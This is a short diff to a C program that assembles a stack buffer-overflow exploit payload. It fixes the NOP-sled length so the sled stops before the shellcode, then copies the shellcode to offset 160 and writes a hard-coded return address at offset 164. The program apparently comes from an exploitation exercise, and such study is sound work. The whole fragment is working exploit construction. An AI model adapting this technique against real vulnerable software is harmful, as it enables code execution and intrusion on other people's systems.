@@ -14,7 +14,7 @@ int main(void) {
 
   int shell_len = strlen(shellcode);
 
-  memset(buf, NOP, 168);
+  memset(buf, NOP, 160 - shell_len);
   memcpy(buf + 160 - shell_len, shellcode, shell_len);
   strcpy(buf + 164, "\x38\xfd\xff\xbf");
 
